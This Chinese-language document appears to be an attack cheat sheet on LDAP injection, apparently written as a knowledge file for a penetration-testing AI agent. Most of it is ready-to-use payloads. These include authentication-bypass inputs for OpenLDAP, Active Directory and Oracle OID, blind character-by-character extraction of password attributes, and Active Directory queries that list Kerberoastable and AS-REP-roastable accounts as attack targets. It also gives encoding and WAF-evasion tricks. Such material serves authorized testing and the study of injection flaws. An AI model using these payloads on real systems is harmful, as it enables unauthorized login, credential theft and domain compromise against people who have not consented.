# LDAP 注入 — 过滤器注入与目录提取

> 应用把用户输入拼进 LDAP 搜索过滤器时，注入过滤器操作符绕过认证或提取目录数据。域环境/企业内网常见，配合 AD 域攻击获取域用户凭据。
> 加载时机: LDAP 认证入口（企业登录/SSO）、389/636/3268 端口、URL 参数含 uid/cn/ou/dc/sAMAccountName、AD 集成认证。

## §1 识别与指纹

| 信号 | 含义 |
|---|---|
| "域\用户名" / user@domain.com 登录格式 | LDAP/AD 认证 |
| 389(LDAP) / 636(LDAPS) / 3268(Global Catalog) | 确认服务 |
| 错误含 LDAP / javax.naming / ldap_bind | 确认后端 |
| 参数名 uid/cn/ou/dc/sAMAccountName | LDAP 属性 |

**过滤器语法**（前缀表达式）:
`(uid=john)` / `(uid=j*)` / `(uid=*john*)` / `(&(a=b)(c=d))` / `(|(a=b)(c=d))` / `(!(a=b))`

**错误指纹**: OpenLDAP `Invalid DN syntax`/`Bad search filter`；AD `Server is unwilling to perform`/`javax.naming.NamingException`；JNDI `InvalidSearchFilterException`/`Unbalanced parenthesis`；PHP `ldap_search(): Search: Bad search filter`；Python `ldap.FILTER_ERROR`。

## §2 实现行为差异（构造 payload 前提）

| 实现 | 多过滤器 | NULL 截断 | 备注 |
|---|---|---|---|
| OpenLDAP | 只执行第一个 | `%00`（旧版 <2.4.x） | 最宽松 |
| MS AD/LDS | 双过滤器报错 | 不支持 | 严格闭合括号 |
| Oracle OID | 严格解析拒绝畸形 | 不支持 | 语法必须合法 |
| SunOne/DSEE | 全部执行 | 部分支持 | 多过滤器可行 |

判定: 注入双过滤器 → 只执行一个=OpenLDAP / 报错=AD / 全执行=SunOne。
探针: `*`（通配符生效?）`）`（报错?）`)(`（闭合+开新?）`%00`（截断?）。

## §3 认证绕过 payload

**通用**（后端 `&(uid=U)(userPassword=P)`）:
- `*` + `*` → `(&(uid=*)(userPassword=*))` 全匹配
- `admin)(&)` → `(&(uid=admin)(&))`——空过滤器 `(&)` 绝对 TRUE
- `adm*` + `*` → 前缀通配
- 用户名枚举: `a*` → `ad*` → `adm*`（响应差异收窄）

**OpenLDAP**（只执行第一个过滤器）:
- `*)(uid=*))(|(uid=*` → 第一个 `(&(uid=*)(uid=*))` 全匹配，后续忽略
- `admin)%00` → 截断密码检查
- `*)(objectClass=*` → present 恒真

**AD**（sAMAccountName; 严格闭合）:
- 用户 `*)(&` 密码 `*)(&` → `(&(sAMAccountName=*)(&)(userPassword=*)(&))`——`(&)` TRUE
- 逻辑短路: `admin)(!(&(|` 密码 `any))` → `(|)` 绝对 FALSE，NOT(AND(FALSE,...))=TRUE
- `admin)(memberOf=*` → 读组信息

**Oracle OID**（严格语法）: `*)(|(objectClass=*` 密码 `x)`；合法子串 `adm*`

## §4 盲注四法

1. **通配符逐字符**: `(&(uid=admin)(userPassword=a*))` 响应异 = 首字符 a；认证场景用户名填 `admin)(userPassword=a*`。description 等备注字段同理。
2. **属性存在性**: `(telephoneNumber=*)`/`(mail=*)`/`(sshPublicKey=*)`；AD: `(adminCount=1)` 管理员、`(memberOf=*admin*)` 管理组。
   属性清单: uid/cn/sn/givenName/mail/telephoneNumber/userPassword/description/title/department/memberOf/homeDirectory/loginShell/sshPublicKey + AD: sAMAccountName/distinguishedName/servicePrincipalName/adminCount/lastLogon/pwdLastSet/userAccountControl
3. **二分法加速**（实现支持 `>=` 时）: `f"{user})({attr}>={known}{chr(mid)}*"`
4. **无通配符**（`*` 被滤）: `>=`/`<=` 范围比较逐字符精确定位: `f"{user})({attr}>={result}{c}"`

oracle: Welcome 字样 / 302 / 响应长度。

## §5 目录遍历与 AD 特化

```
(&(objectClass=user)(uid=*))                     # 全用户
(&(objectClass=user)(adminCount=1))              # 管理员
(&(objectClass=user)(servicePrincipalName=*))    # 服务账户
(&(objectClass=computer)(cn=*))                  # 计算机
(&(objectClass=user)(memberOf=CN=Domain Admins,...))  # 组成员
```
**AD UAC 位查询**（`1.2.840.113556.1.4.803:=` 位与 OID）:
```
(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))                 # Kerberoastable
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))   # AS-REP Roastable
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))     # 密码永不过期
```
价值: 目录枚举能力 → Kerberoast/AS-REP 目标清单。

## §6 过滤器绕过

- **十六进制编码**: `\2a`=`*` `\28`=`(` `\29`=`)` `\5c`=`\` `\00`=NUL——`*` 被滤时用编码还原
- **URL 编码叠加**: `admin%29%28uid%3d%2a` → `admin)(uid=*`
- **括号平衡**: `admin)(cn=*))(&(cn=void` → 第一个完整过滤器被执行；嵌套: `*)(|(cn=*)(sn=*` 密码 `))`
- **WAF 绕过**: 属性名不区分大小写（`uId=`≡`uid=`）；OID 替代属性名（`0.9.2342.19200300.100.1.1=`≡`uid=`、`2.5.4.3=`≡`cn=`）；空格插入 `( uid = admin )`

## §7 关联文件

- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 注入类速查
- `$AGENT_DIR/knowledge-base/deserialization.md` — JNDI/LDAP 外连（JNDI 注入侧）
